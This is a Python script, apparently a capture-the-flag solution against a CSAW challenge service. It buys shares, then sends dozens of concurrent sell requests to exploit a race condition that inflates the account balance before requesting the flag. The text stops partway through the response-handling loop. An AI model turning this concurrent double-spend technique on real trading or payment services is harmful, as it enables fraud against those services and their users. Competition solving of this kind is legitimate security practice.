import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://android-dropper.csaw.io:4657"
KEY = "testuser123_v4"  # New key

def buy_stock(stock):
    try:
        return requests.post(f"{BASE_URL}/buy", data={"key": KEY, "stock": stock}, timeout=2)
    except:
        return None

def sell_stock(stock):
    try:
        return requests.post(f"{BASE_URL}/sell", data={"key": KEY, "stock": stock}, timeout=2)
    except:
        return None

def check_balance():
    try:
        r = requests.post(f"{BASE_URL}/login", data={"key": KEY}, timeout=2)
        return r.json()
    except:
        return {"balance": 0}

def get_flag():
    return requests.post(f"{BASE_URL}/flag", data={"key": KEY})

def exploit_backup():
    print("Initial state:", check_balance())

    # Buy BURPSHARKHAT when price is low
    stocks_to_buy = 5
    for _ in range(stocks_to_buy):
        buy_stock("BURPSHARKHAT")
        time.sleep(0.2)
        print("After buy:", check_balance())

    # Create backup state with first sell
    time.sleep(0.5)
    sell_stock("BURPSHARKHAT")
    print("After first sell:", check_balance())

    # Multiple rapid sells with increased concurrency
    for attempt in range(5):
        print(f"\nAttempt {attempt + 1}")
        with ThreadPoolExecutor(max_workers=30) as executor:
            future_to_sell = {executor.submit(sell_stock, "BURPSHARKHAT"): i for i in range(25)}

            for future in as_completed(future_to_sell):
                idx = future_to_sell[future]
                try:
                    response = future.result()
                    if response:
